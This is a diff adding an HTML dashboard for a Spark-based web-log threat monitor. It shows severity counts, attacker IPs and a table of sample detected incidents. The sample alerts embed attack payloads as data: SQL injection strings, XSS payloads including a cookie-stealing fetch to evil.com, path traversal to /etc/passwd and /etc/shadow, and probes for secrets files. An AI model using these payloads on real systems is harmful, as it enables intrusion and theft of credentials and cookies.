@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cybersecurity Threat Intelligence Dashboard - Spark & Scala</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-card: #111827;
+            --bg-hover: #1f2937;
+            --border: #1e293b;
+            --text-main: #f3f4f6;
+            --text-muted: #9ca3af;
+            --accent-crit: #ef4444;
+            --accent-high: #f97316;
+            --accent-med: #eab308;
+            --accent-low: #3b82f6;
+            --accent-cyan: #06b6d4;
+            --accent-green: #10b981;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-primary);
+            color: var(--text-main);
+            padding: 24px;
+            min-height: 100vh;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 20px;
+            margin-bottom: 24px;
+            flex-wrap: wrap;
+            gap: 16px;
+        }
+
+        .header-title h1 {
+            font-size: 1.6rem;
+            font-weight: 700;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #ffffff;
+            letter-spacing: -0.02em;
+        }
+
+        .badges {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-top: 6px;
+        }
+
+        .badge-spark {
+            background: rgba(6, 182, 212, 0.12);
+            color: var(--accent-cyan);
+            border: 1px solid rgba(6, 182, 212, 0.3);
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-family: 'JetBrains Mono', monospace;
+            font-weight: 600;
+        }
+
+        .badge-live {
+            background: rgba(16, 185, 129, 0.12);
+            color: var(--accent-green);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            padding: 3px 8px;
+            border-radius: 6px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .pulse-dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background-color: var(--accent-green);
+            box-shadow: 0 0 8px var(--accent-green);
+        }
+
+        .btn-upload {
+            background: #1e293b;
+            color: #cbd5e1;
+            border: 1px solid var(--border);
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+
+        .btn-upload:hover {
+            background: var(--bg-hover);
+            color: #fff;
+            border-color: var(--accent-cyan);
+        }
+
+        /* KPI summary grid */
+        .kpi-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .kpi-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .kpi-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+        }
+
+        .kpi-card.cyan::before { background: var(--accent-cyan); }
+        .kpi-card.crit::before { background: var(--accent-crit); }
+        .kpi-card.high::before { background: var(--accent-high); }
+        .kpi-card.med::before  { background: var(--accent-med); }
+
+        .kpi-title {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            font-weight: 600;
+            margin-bottom: 6px;
+        }
+
+        .kpi-val {
+            font-size: 2.2rem;
+            font-weight: 700;
+            font-family: 'JetBrains Mono', monospace;
+        }
+
+        .kpi-sub {
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            margin-top: 4px;
+        }
+
+        /* 2-column layout */
+        .grid-2col {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+
+        @media (max-width: 960px) {
+            .grid-2col { grid-template-columns: 1fr; }
+        }
+
+        .section-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 22px;
+        }
+
+        .section-header {
+            font-size: 1.05rem;
+            font-weight: 600;
+            margin-bottom: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+
+        th {
+            text-align: left;
+            padding: 10px 12px;
+            background: rgba(255, 255, 255, 0.02);
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            letter-spacing: 0.06em;
+            font-weight: 600;
+        }
+
+        td {
+            padding: 12px;
+            border-bottom: 1px solid var(--border);
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.82rem;
+        }
+
+        tr:hover td {
+            background: var(--bg-hover);
+        }
+
+        .pill {
+            display: inline-block;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            letter-spacing: 0.03em;
+            text-transform: uppercase;
+        }
+
+        .pill.CRITICAL { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.35); }
+        .pill.HIGH     { background: rgba(249, 115, 22, 0.15); color: #fb923c; border: 1px solid rgba(249, 115, 22, 0.35); }
+        .pill.MEDIUM   { background: rgba(234, 179, 8, 0.15);  color: #facc15; border: 1px solid rgba(234, 179, 8, 0.35); }
+        .pill.LOW      { background: rgba(59, 130, 246, 0.15); color: #60a5fa; border: 1px solid rgba(59, 130, 246, 0.35); }
+
+        .severity-bar {
+            display: flex;
+            height: 14px;
+            border-radius: 7px;
+            overflow: hidden;
+            margin-top: 14px;
+            background: #1e293b;
+        }
+        .bar-crit { background: var(--accent-crit); width: 25%; }
+        .bar-high { background: var(--accent-high); width: 45%; }
+        .bar-med  { background: var(--accent-med); width: 30%; }
+
+        .legend {
+            display: flex;
+            gap: 16px;
+            margin-top: 12px;
+            font-size: 0.78rem;
+            color: var(--text-muted);
+            flex-wrap: wrap;
+        }
+        .legend-item { display: flex; align-items: center; gap: 6px; }
+        .legend-dot { width: 9px; height: 9px; border-radius: 50%; }
+
+        /* Incident stream controls */
+        .stream-controls {
+            display: flex;
+            gap: 12px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .search-input {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 8px 14px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+            width: 280px;
+        }
+
+        .filter-select {
+            background: var(--bg-primary);
+            border: 1px solid var(--border);
+            color: var(--text-main);
+            padding: 8px 12px;
+            border-radius: 6px;
+            font-size: 0.85rem;
+        }
+
+        .code-snippet {
+            max-width: 320px;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            white-space: nowrap;
+            display: block;
+            color: #93c5fd;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div class="header-title">
+            <div>
+                <h1>🛡️ SOC Operations: Spark Web Log Threat Monitor</h1>
+                <div class="badges">
+                    <span class="badge-spark">Apache Spark 3.5.0 Engine</span>
+                    <span class="badge-spark">Scala 2.12</span>
+                    <span class="badge-live"><div class="pulse-dot"></div> Live Analysis Active</span>
+                </div>
+            </div>
+        </div>
+        <div>
+            <label class="btn-upload">
+                📂 Import security_alerts.json
+                <input type="file" id="json-file-input" accept=".json" style="display:none;">
+            </label>
+        </div>
+    </header>
+
+    <!-- Top KPI Grid -->
+    <div class="kpi-grid">
+        <div class="kpi-card cyan">
+            <div class="kpi-title">Logs Analyzed</div>
+            <div class="kpi-val" id="kpi-logs">57</div>
+            <div class="kpi-sub">Source: data/sample_access.log</div>
+        </div>
+        <div class="kpi-card crit">
+            <div class="kpi-title">Flagged Incidents</div>
+            <div class="kpi-val" id="kpi-alerts">20</div>
+            <div class="kpi-sub">Threat Detection Rate: 35.1%</div>
+        </div>
+        <div class="kpi-card crit">
+            <div class="kpi-title">Critical Threats</div>
+            <div class="kpi-val" id="kpi-crit">5</div>
+            <div class="kpi-sub">SQLi & Path Traversals</div>
+        </div>
+        <div class="kpi-card high">
+            <div class="kpi-title">Top Attacking IP</div>
+            <div class="kpi-val" style="font-size: 1.35rem;" id="kpi-top-ip">198.51.100.89</div>
+            <div class="kpi-sub">Risk Score: 450 (CRITICAL)</div>
+        </div>
+    </div>
+
+    <!-- Severity Distribution & Malicious IP Matrix -->
+    <div class="grid-2col">
+        <div class="section-card">
+            <div class="section-header">
+                <span>Incident Severity Breakdown</span>
+            </div>
+            <div class="severity-bar">
+                <div class="bar-crit" title="Critical: 5 (25%)"></div>
+                <div class="bar-high" title="High: 9 (45%)"></div>
+                <div class="bar-med"  title="Medium: 6 (30%)"></div>
+            </div>
+            <div class="legend">
+                <div class="legend-item"><div class="legend-dot" style="background:var(--accent-crit)"></div> CRITICAL (5 alerts, 25%)</div>
+                <div class="legend-item"><div class="legend-dot" style="background:var(--accent-high)"></div> HIGH (9 alerts, 45%)</div>
+                <div class="legend-item"><div class="legend-dot" style="background:var(--accent-med)"></div> MEDIUM (6 alerts, 30%)</div>
+            </div>
+
+            <table style="margin-top: 20px;">
+                <thead>
+                    <tr><th>Threat Category</th><th>Severity</th><th>Alerts</th><th>Risk Weight</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td>XSS Script Injection</td><td><span class="pill HIGH">HIGH</span></td><td>4</td><td>50 pts/ea</td></tr>
+                    <tr><td>Sensitive Files Exposure (.env/.git)</td><td><span class="pill HIGH">HIGH</span></td><td>4</td><td>50 pts/ea</td></tr>
+                    <tr><td>SQL Injection (SQLi)</td><td><span class="pill CRITICAL">CRITICAL</span></td><td>3</td><td>100 pts/ea</td></tr>
+                    <tr><td>Scanner Tool Fingerprints (Nikto/Hydra)</td><td><span class="pill MEDIUM">MEDIUM</span></td><td>3</td><td>25 pts/ea</td></tr>
+                    <tr><td>Path Traversal / LFI (/etc/passwd)</td><td><span class="pill CRITICAL">CRITICAL</span></td><td>2</td><td>100 pts/ea</td></tr>
+                    <tr><td>Reconnaissance 404 Probing</td><td><span class="pill MEDIUM">MEDIUM</span></td><td>2</td><td>25 pts/ea</td></tr>
+                    <tr><td>Credential Brute-Force Auth</td><td><span class="pill HIGH">HIGH</span></td><td>1</td><td>50 pts/ea</td></tr>
+                    <tr><td>Volumetric DoS Rate Flood</td><td><span class="pill MEDIUM">MEDIUM</span></td><td>1</td><td>25 pts/ea</td></tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="section-card">
+            <div class="section-header">
+                <span>Top Malicious IP Threat Matrix</span>
+            </div>
+            <table>
+                <thead>
+                    <tr><th>Attacker IP</th><th>Risk Score</th><th>Alerts</th><th>Threat Rating</th></tr>
+                </thead>
+                <tbody id="ip-table-body">
+                    <tr>
+                        <td>198.51.100.89</td>
+                        <td style="color:var(--accent-crit); font-weight:700;">450</td>
+                        <td>8</td>
+                        <td><span class="pill CRITICAL">CRITICAL THREAT</span></td>
+                    </tr>
+                    <tr>
+                        <td>203.0.113.45</td>
+                        <td style="color:var(--accent-crit); font-weight:700;">300</td>
+                        <td>3</td>
+                        <td><span class="pill CRITICAL">CRITICAL THREAT</span></td>
+                    </tr>
+                    <tr>
+                        <td>198.51.100.22</td>
+                        <td style="color:var(--accent-crit); font-weight:700;">200</td>
+                        <td>4</td>
+                        <td><span class="pill CRITICAL">CRITICAL THREAT</span></td>
+                    </tr>
+                    <tr>
+                        <td>185.220.101.5</td>
+                        <td style="color:var(--accent-high); font-weight:700;">75</td>
+                        <td>2</td>
+                        <td><span class="pill HIGH">HIGH RISK</span></td>
+                    </tr>
+                    <tr>
+                        <td>192.241.220.11</td>
+                        <td style="color:var(--accent-med); font-weight:700;">50</td>
+                        <td>2</td>
+                        <td><span class="pill MEDIUM">ELEVATED CONCERN</span></td>
+                    </tr>
+                    <tr>
+                        <td>45.33.32.156</td>
+                        <td style="color:var(--text-muted); font-weight:700;">25</td>
+                        <td>1</td>
+                        <td><span class="pill LOW">SUSPICIOUS</span></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+
+    <!-- Security Incidents Stream -->
+    <div class="section-card">
+        <div class="section-header">
+            <span>Detected Security Incidents Stream (<span id="incident-count">20</span> alerts)</span>
+            <div class="stream-controls">
+                <select id="severity-filter" class="filter-select">
+                    <option value="ALL">All Severities</option>
+                    <option value="CRITICAL">Critical Only</option>
+                    <option value="HIGH">High Only</option>
+                    <option value="MEDIUM">Medium Only</option>
+                </select>
+                <input type="text" id="filter-input" class="search-input" placeholder="Search IP, endpoint, or pattern...">
+            </div>
+        </div>
+        <table>
+            <thead>
+                <tr>
+                    <th>Timestamp</th>
+                    <th>Client IP</th>
+                    <th>Category</th>
+                    <th>Severity</th>
+                    <th>Target Endpoint</th>
+                    <th>Pattern / Anomaly Description</th>
+                </tr>
+            </thead>
+            <tbody id="incident-stream-body">
+                <!-- Dynamically Populated / Pre-loaded from Spark Run -->
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        // Actual alerts generated by Spark execution
+        let alertsData = [
+            {"timestamp":"2024-05-10 19:31:00","clientIp":"203.0.113.45","threatCategory":"SQL_INJECTION","severity":"CRITICAL","endpoint":"/products?id=1%20UNION%20SELECT%20null,username,password%20FROM%20users","matchedPattern":"SQL syntax injection keywords / boolean tautology"},
+            {"timestamp":"2024-05-10 19:31:05","clientIp":"203.0.113.45","threatCategory":"SQL_INJECTION","severity":"CRITICAL","endpoint":"/login?user=admin'%20or%20'1'='1'--","matchedPattern":"SQL syntax injection keywords / boolean tautology"},
+            {"timestamp":"2024-05-10 19:31:12","clientIp":"203.0.113.45","threatCategory":"SQL_INJECTION","severity":"CRITICAL","endpoint":"/api/search?q=1;%20SLEEP(5)--","matchedPattern":"SQL syntax injection keywords / boolean tautology"},
+            {"timestamp":"2024-05-10 19:32:00","clientIp":"198.51.100.22","threatCategory":"XSS_ATTACK","severity":"HIGH","endpoint":"/feedback?msg=<script>alert('xss')<\\/script>","matchedPattern":"Script tags or inline JS event handler payload"},
+            {"timestamp":"2024-05-10 19:32:10","clientIp":"198.51.100.22","threatCategory":"XSS_ATTACK","severity":"HIGH","endpoint":"/search?q=%3Cscript%3Efetch('http://evil.com?c='+document.cookie)%3C\\/script%3E","matchedPattern":"Script tags or inline JS event handler payload"},
+            {"timestamp":"2024-05-10 19:32:22","clientIp":"198.51.100.22","threatCategory":"XSS_ATTACK","severity":"HIGH","endpoint":"/profile?name=test<img src=x onerror=alert(1)>","matchedPattern":"Script tags or inline JS event handler payload"},
+            {"timestamp":"2024-05-10 19:32:35","clientIp":"198.51.100.22","threatCategory":"XSS_ATTACK","severity":"HIGH","endpoint":"/redirect?url=javascript:eval(document.cookie)","matchedPattern":"Script tags or inline JS event handler payload"},
+            {"timestamp":"2024-05-10 19:33:00","clientIp":"198.51.100.89","threatCategory":"PATH_TRAVERSAL","severity":"CRITICAL","endpoint":"/download?file=../../../../etc/passwd","matchedPattern":"Directory traversal sequence / system file path"},
+            {"timestamp":"2024-05-10 19:33:05","clientIp":"198.51.100.89","threatCategory":"PATH_TRAVERSAL","severity":"CRITICAL","endpoint":"/view?path=%2e%2e%2f%2e%2e%2fetc/shadow","matchedPattern":"Directory traversal sequence / system file path"},
+            {"timestamp":"2024-05-10 19:33:10","clientIp":"198.51.100.89","threatCategory":"SENSITIVE_FILE_EXPOSURE","severity":"HIGH","endpoint":"/.env","matchedPattern":"Configuration, git repository, or environment secrets path"},
+            {"timestamp":"2024-05-10 19:33:15","clientIp":"198.51.100.89","threatCategory":"SENSITIVE_FILE_EXPOSURE","severity":"HIGH","endpoint":"/.git/config","matchedPattern":"Configuration, git repository, or environment secrets path"},
+            {"timestamp":"2024-05-10 19:33:20","clientIp":"198.51.100.89","threatCategory":"SENSITIVE_FILE_EXPOSURE","severity":"HIGH","endpoint":"/wp-config.php","matchedPattern":"Configuration, git repository, or environment secrets path"},
+            {"timestamp":"2024-05-10 19:33:25","clientIp":"198.51.100.89","threatCategory":"SENSITIVE_FILE_EXPOSURE","severity":"HIGH","endpoint":"/backup.sql","matchedPattern":"Configuration, git repository, or environment secrets path"},
+            {"timestamp":"2024-05-10 19:34:16","clientIp":"185.220.101.5","threatCategory":"BRUTE_FORCE_AUTH","severity":"HIGH","endpoint":"/api/v1/auth/login","matchedPattern":"6 failed auth attempts within 60s"},
+            {"timestamp":"2024-05-10 19:34:16","clientIp":"185.220.101.5","threatCategory":"RECON_TOOL_SCAN","severity":"MEDIUM","endpoint":"/api/v1/auth/login","matchedPattern":"Automated tool signature in User-Agent: Hydra/9.2"},
+            {"timestamp":"2024-05-10 19:35:10","clientIp":"192.241.220.11","threatCategory":"RECON_TOOL_SCAN","severity":"MEDIUM","endpoint":"/admin","matchedPattern":"Automated tool signature in User-Agent: Nikto/2.1.6"},
+            {"timestamp":"2024-05-10 19:35:10","clientIp":"192.241.220.11","threatCategory":"RECON_404_PROBE","severity":"MEDIUM","endpoint":"/admin","matchedPattern":"High 404 volume: 6 distinct missing endpoints (6 requests)"},
+            {"timestamp":"2024-05-10 19:33:25","clientIp":"198.51.100.89","threatCategory":"RECON_TOOL_SCAN","severity":"MEDIUM","endpoint":"/download?file=../../../../etc/passwd","matchedPattern":"Automated tool signature in User-Agent: curl/7.68.0"},
+            {"timestamp":"2024-05-10 19:33:25","clientIp":"198.51.100.89","threatCategory":"RECON_404_PROBE","severity":"MEDIUM","endpoint":"/.env","matchedPattern":"High 404 volume: 4 distinct missing endpoints (4 requests)"},
+            {"timestamp":"2024-05-10 19:36:09","clientIp":"45.33.32.156","threatCategory":"DOS_RATE_LIMIT","severity":"MEDIUM","endpoint":"/api/v1/products/stream","matchedPattern":"Rate spike: 18 reqs within 60s"}
+        ];
+
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        function renderTable(data) {
+            const tbody = document.getElementById('incident-stream-body');
+            tbody.innerHTML = '';
+            document.getElementById('incident-count').textContent = data.length;
+
+            data.forEach(item => {
+                const tr = document.createElement('tr');
+                tr.innerHTML = `
+                    <td>${escapeHtml(item.timestamp)}</td>
+                    <td style="font-weight:600;">${escapeHtml(item.clientIp)}</td>
+                    <td>${escapeHtml(item.threatCategory)}</td>
+                    <td><span class="pill ${escapeHtml(item.severity)}">${escapeHtml(item.severity)}</span></td>
+                    <td><span class="code-snippet" title="${escapeHtml(item.endpoint)}">${escapeHtml(item.endpoint)}</span></td>
+                    <td style="color:var(--text-muted);">${escapeHtml(item.matchedPattern)}</td>
+                `;
+                tbody.appendChild(tr);
+            });
+        }
+
+        // Filter functionality
+        function applyFilters() {
+            const searchTerm = document.getElementById('filter-input').value.toLowerCase();
+            const severity = document.getElementById('severity-filter').value;
+
+            const filtered = alertsData.filter(item => {
+                const matchesSeverity = (severity === 'ALL' || item.severity === severity);
+                const matchesSearch = 
+                    item.clientIp.toLowerCase().includes(searchTerm) ||
+                    item.endpoint.toLowerCase().includes(searchTerm) ||
+                    item.threatCategory.toLowerCase().includes(searchTerm) ||
+                    item.matchedPattern.toLowerCase().includes(searchTerm);
+                return matchesSeverity && matchesSearch;
+            });
+
+            renderTable(filtered);
+        }
+
+        document.getElementById('filter-input').addEventListener('input', applyFilters);
+        document.getElementById('severity-filter').addEventListener('change', applyFilters);
+
+        // Allow users to upload new security_alerts.json dynamically
+        document.getElementById('json-file-input').addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = function(evt) {
+                const lines = evt.target.result.trim().split('\n');
+                const parsed = [];
+                lines.forEach(l => {
+                    try { parsed.push(JSON.parse(l)); } catch(err) {}
+                });
+                if (parsed.length > 0) {
+                    alertsData = parsed;
+                    applyFilters();
+                    document.getElementById('kpi-alerts').textContent = alertsData.length;
+                    document.getElementById('kpi-crit').textContent = alertsData.filter(a => a.severity === 'CRITICAL').length;
+                }
+            };
+            reader.readAsText(file);
+        });
+
+        // Initial render
+        renderTable(alertsData);
+    </script>
+</body>
+</html>
